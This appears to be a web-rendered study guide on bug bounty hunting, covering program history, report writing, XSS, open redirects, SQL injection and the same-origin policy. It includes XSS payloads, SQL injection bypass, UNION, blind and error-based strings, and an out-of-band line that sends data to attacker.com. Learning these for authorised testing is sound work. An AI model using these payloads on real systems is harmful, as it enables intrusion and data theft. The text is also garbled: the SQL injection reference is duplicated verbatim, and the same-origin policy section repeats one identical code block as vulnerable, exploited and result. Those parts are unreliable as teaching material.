Chapter 1 Part I: The Industry

Picking a Bug Bounty Program

Learn how to choose the right bug bounty program that matches your skills and maximizes your success potential.

The State of the Industry

Bug bounties are currently one of the most popular ways for organizations to receive feedback about security bugs. Large corporations, like PayPal and Facebook, as well as government agencies like the US Department of Defense, have all embraced the idea.

Historical Context

Yet not too long ago, reporting a vulnerability to a company would have more likely landed you in jail than gotten you a reward.

1995

First Bug Bounty Program

Netscape launched the first-ever bug bounty program, encouraging users to report bugs in Netscape Navigator 2.0, introducing crowdsourced security testing to the internet world.

2004

Mozilla Follows

Mozilla launched the next corporate bug bounty program, inviting users to identify bugs in the Firefox browser.

2010s

Modern Era Begins

Google launched its program in 2010, Facebook followed in 2011. These programs kick-started the trend of using bug bounties to augment corporate security infrastructure.

2012

Platform Era

HackerOne and Bugcrowd both launched, creating bug-bounty-as-a-service platforms to help companies set up and operate their programs.

Chapter 2 Part I: The Industry

Sustaining Your Success

Master the art of writing effective bug reports, building relationships with development teams, and maintaining long-term success in bug bounty hunting.

Writing a Good Report

A well-written vulnerability report is crucial for effective communication with security teams and getting your findings acknowledged and fixed promptly.

1

Craft a Descriptive Title

Make your title specific and descriptive. Include the vulnerability type and affected component.

Good: "SQL Injection in user search functionality"
Bad: "Security vulnerability found"
2

Provide a Clear Summary

Explain what the vulnerability is and where it's located in 2-3 sentences.

3

Include Severity Assessment

Use CVSS or the program's severity guidelines to classify the bug's impact.

4

Give Clear Steps to Reproduce

Provide detailed, step-by-step instructions that anyone can follow to reproduce the issue.

5

Provide Proof of Concept

Include screenshots, videos, or code snippets that demonstrate the vulnerability.

6

Describe Impact & Attack Scenarios

Explain what an attacker could accomplish by exploiting this vulnerability.

7

Recommend Mitigations

Suggest how the vulnerability could be fixed, but avoid being overly technical.

8

Validate the Report

Review your report for technical errors and ensure all information is accurate.

Remember

Don't assume anything. Be verbose with details but concise with unnecessary information. Write what you'd want to read as a security engineer.

Understanding Report States

Need More Information

Security team needs clarification or additional details to understand or reproduce the issue.

Action: Provide missing information promptly

Informative

Issue is acknowledged but not significant enough to warrant a fix. No bounty awarded.

Action: Try to chain with other bugs

Duplicate

Another researcher already found this bug. No bounty awarded.

Action: Help with remediation or escalate

Not Applicable (N/A)

Report doesn't contain a valid security issue or contains technical errors.

Action: Learn and move on

Triaged

Security team validated the bug and plans to fix it. Bounty likely.

Action: Help with remediation

Resolved

Vulnerability has been fixed. Payment issued if applicable.

Action: Celebrate and continue hacking!

Chapter 6 Part III: Web Vulnerabilities

Cross-Site Scripting (XSS)

Learn about one of the most common web vulnerabilities: Cross-Site Scripting (XSS), its types, impact, and exploitation techniques.

Understanding Cross-Site Scripting

Cross-Site Scripting (XSS) occurs when an attacker can execute arbitrary JavaScript code in another user's browser by injecting malicious scripts into web applications.

Impact & Severity

High Severity

Can lead to account takeover, session hijacking, and data theft

What attackers can achieve:
  • Steal session cookies and authentication tokens
  • Perform actions on behalf of the victim
  • Modify page content (defacement)
  • Redirect users to malicious sites
  • Capture keystrokes and form data
  • Install malware or exploit browser vulnerabilities

Types of XSS Vulnerabilities

Reflected XSS

Script is reflected from the web server, such as in an error message or search result

1 Attacker crafts malicious URL
→
2 Victim clicks the link
→
3 Server reflects payload
→
4 Browser executes script
Example: https://example.com/search?q=<script>alert('XSS')</script>

Stored XSS

Malicious script is permanently stored on the target server (database, file, etc.)

1 Attacker submits payload
→
2 Server stores payload
→
3 Victim views content
→
4 Browser executes script
Common locations: Comments, profiles, forums, guestbooks

DOM-based XSS

Vulnerability exists in client-side code rather than server-side

1 Malicious URL crafted
→
2 Victim accesses page
→
3 Client-side JS processes
→
4 DOM manipulation executes payload
Example: document.write(location.hash.substring(1))

Hunting for XSS Vulnerabilities

Step-by-Step XSS Discovery Process

1
Identify Input Points

Find all places where user input is accepted and reflected

  • URL parameters
  • POST data
  • Headers (User-Agent, Referer)
  • Cookies
  • File uploads
2
Test Basic Payloads

Start with simple payloads to identify reflection points

<script>alert('XSS')</script> <img src=x onerror=alert('XSS')> <svg onload=alert('XSS')>
3
Analyze Filtering

Understand how input is processed and filtered

  • Check for HTML encoding
  • Test for tag/attribute blacklisting
  • Look for context-specific filtering
  • Test different injection contexts
4
Bypass Filters

Use advanced techniques to bypass security controls

Case variation URL encoding HTML encoding JavaScript obfuscation Event handlers

Open Redirects

Learn about open redirect vulnerabilities where attackers can redirect users to malicious websites, often used in phishing attacks and as a stepping stone for other exploits.

Understanding Open Redirects

Open redirect vulnerabilities occur when an application accepts user-controllable input that specifies a link to an external site, and uses that input to redirect the user to the external site.

Impact & Severity

Medium Severity

Often used as stepping stone for phishing and social engineering attacks

What attackers can achieve:
  • Redirect users to phishing sites
  • Bypass URL validation in other vulnerabilities
  • Social engineering attacks using trusted domains
  • Session fixation attacks
  • Bypass domain restrictions in CSP
  • Chain with other vulnerabilities (SSRF, OAuth attacks)

Basic Open Redirect Example

Vulnerable URL:
https://trusted-site.com/redirect?url=https://evil-site.com
Attack Scenario:
1. Attacker sends victim a link to trusted-site.com
2. Victim clicks, trusting the domain
3. Application redirects to evil-site.com
4. Victim thinks they're still on trusted site

SQL Injection

Master SQL injection attacks, one of the most devastating vulnerabilities that can lead to complete database compromise and system takeover.

Understanding SQL Injection

SQL injection occurs when an attacker can manipulate SQL queries by injecting malicious SQL code through application input fields, potentially gaining unauthorized access to the database.

Impact & Severity

Critical Severity

Can lead to complete database compromise and system takeover

What attackers can achieve:
  • Read sensitive data from the database
  • Modify or delete database records
  • Bypass authentication mechanisms
  • Execute administrative operations on the database
  • Read files from the server filesystem
  • Execute arbitrary commands on the operating system

Basic SQL Injection Example

Vulnerable Code:
String query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";
Malicious Input:
Username: admin'--
Password: anything
Resulting Query:
SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything'

The password check is commented out, allowing bypass!

Types of SQL Injection

Union-based SQLi

Uses UNION SQL operator to combine results from injected query with original query

Requirements:
  • Same number of columns
  • Compatible data types
  • Application displays database errors
Example: ' UNION SELECT null,username,password FROM users--

Boolean-based Blind SQLi

Relies on sending SQL queries that force application to return different results

Characteristics:
  • No direct data output
  • Relies on true/false responses
  • Slower but more stealthy
Example: ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--

Time-based Blind SQLi

Uses database functions to cause delays to infer information

Methods:
  • SLEEP() function in MySQL
  • WAITFOR DELAY in SQL Server
  • pg_sleep() in PostgreSQL
Example: ' AND IF(1=1,SLEEP(5),0)--

Error-based SQLi

Triggers database errors that reveal information about the database structure

Techniques:
  • Duplicate entry errors
  • Type conversion errors
  • XML function errors
Example: ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()),0x7e))--

SQL Injection Types Reference

In-band SQLi (Classic SQLi)

Easy to Exploit

Definition: The most common SQL injection attack where the attacker uses the same communication channel to both launch the attack and gather results.

Key Characteristics:

  • Direct feedback from database
  • Results visible in application response
  • Fast data extraction
Sub-types: Error-based SQLi, Union-based SQLi

Error-based SQLi

Easy

Definition: Relies on error messages thrown by the database server to obtain information about the database structure.

How it Works:

  • Triggers intentional database errors
  • Extracts data from error messages
  • Sometimes enough to enumerate entire database
Example: ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()),0x7e))--

Union-based SQLi

Medium

Definition: Uses the UNION SQL operator to combine results from injected query with original query, returned as part of HTTP response.

Requirements:

  • Same number of columns in both queries
  • Compatible data types
  • Application displays query results
Example: ' UNION SELECT null,username,password FROM users--

Inferential SQLi (Blind SQLi)

Hard

Definition: No data is directly transferred; attacker reconstructs database structure by observing application behavior and database server responses.

Characteristics:

  • No visible data in response
  • Slower exploitation process
  • Requires patient, methodical approach
  • Just as dangerous as in-band attacks
Sub-types: Boolean-based, Time-based

Boolean-based Blind SQLi

Hard

Definition: Forces the application to return different results based on whether the SQL query returns TRUE or FALSE.

Method:

  • Send queries that return true/false
  • Observe differences in HTTP response
  • Infer data character by character
Example: ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--

Time-based Blind SQLi

Hard

Definition: Forces the database to wait a specified amount of time before responding, using response time to infer TRUE/FALSE results.

Database Functions:

  • MySQL: SLEEP(5)
  • SQL Server: WAITFOR DELAY '00:00:05'
  • PostgreSQL: pg_sleep(5)
Example: ' AND IF((SELECT COUNT(*) FROM users)>5,SLEEP(5),0)--

Out-of-band SQLi

Expert

Definition: Uses a different communication channel to launch the attack and gather results when the same channel cannot be used.

Requirements:

  • Database server features must be enabled
  • Alternative communication channels (DNS, HTTP)
  • Useful when server responses are unstable
Example (DNS): ' AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT user()), '.attacker.com\\test.txt')))--

Voice-based SQLi

Rare

Definition: SQL injection attack applied through voice commands in applications that provide database access via voice interfaces.

Target Applications:

  • Voice-controlled database applications
  • Smart assistants with database integration
  • Voice-to-text input systems
Spoken Example: "Search for user admin quote semicolon drop table users semicolon comment"

In-band SQLi (Classic SQLi)

Easy to Exploit

Definition: The most common SQL injection attack where the attacker uses the same communication channel to both launch the attack and gather results.

Key Characteristics:

  • Direct feedback from database
  • Results visible in application response
  • Fast data extraction
Sub-types: Error-based SQLi, Union-based SQLi

Error-based SQLi

Easy

Definition: Relies on error messages thrown by the database server to obtain information about the database structure.

How it Works:

  • Triggers intentional database errors
  • Extracts data from error messages
  • Sometimes enough to enumerate entire database
Example: ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()),0x7e))--

Union-based SQLi

Medium

Definition: Uses the UNION SQL operator to combine results from injected query with original query, returned as part of HTTP response.

Requirements:

  • Same number of columns in both queries
  • Compatible data types
  • Application displays query results
Example: ' UNION SELECT null,username,password FROM users--

Inferential SQLi (Blind SQLi)

Hard

Definition: No data is directly transferred; attacker reconstructs database structure by observing application behavior and database server responses.

Characteristics:

  • No visible data in response
  • Slower exploitation process
  • Requires patient, methodical approach
  • Just as dangerous as in-band attacks
Sub-types: Boolean-based, Time-based

Boolean-based Blind SQLi

Hard

Definition: Forces the application to return different results based on whether the SQL query returns TRUE or FALSE.

Method:

  • Send queries that return true/false
  • Observe differences in HTTP response
  • Infer data character by character
Example: ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--

Time-based Blind SQLi

Hard

Definition: Forces the database to wait a specified amount of time before responding, using response time to infer TRUE/FALSE results.

Database Functions:

  • MySQL: SLEEP(5)
  • SQL Server: WAITFOR DELAY '00:00:05'
  • PostgreSQL: pg_sleep(5)
Example: ' AND IF((SELECT COUNT(*) FROM users)>5,SLEEP(5),0)--

Out-of-band SQLi

Expert

Definition: Uses a different communication channel to launch the attack and gather results when the same channel cannot be used.

Requirements:

  • Database server features must be enabled
  • Alternative communication channels (DNS, HTTP)
  • Useful when server responses are unstable
Example (DNS): ' AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT user()), '.attacker.com\\test.txt')))--

Voice-based SQLi

Rare

Definition: SQL injection attack applied through voice commands in applications that provide database access via voice interfaces.

Target Applications:

  • Voice-controlled database applications
  • Smart assistants with database integration
  • Voice-to-text input systems
Spoken Example: "Search for user admin quote semicolon drop table users semicolon comment"

Same-Origin Policy

Understand the same-origin policy and its implications for web security.

Understanding Same-Origin Policy

The same-origin policy is a security measure implemented by web browsers to prevent scripts from one web page from accessing resources in another web page.

Impact & Severity

Medium Severity

Can lead to unauthorized access and data leakage

What attackers can achieve:
  • Cross-site scripting (XSS)
  • Cross-site request forgery (CSRF)
  • Information disclosure
  • Data theft
  • Privilege escalation
  • Compromise other services

Basic Same-Origin Policy Violation

Vulnerable Code:
<script src="http://attacker.com/script.js"></script>
Exploited Code:
<script src="http://attacker.com/script.js"></script>
Result:
<script src="http://attacker.com/script.js"></script>

The script from attacker.com is executed on the victim's page!
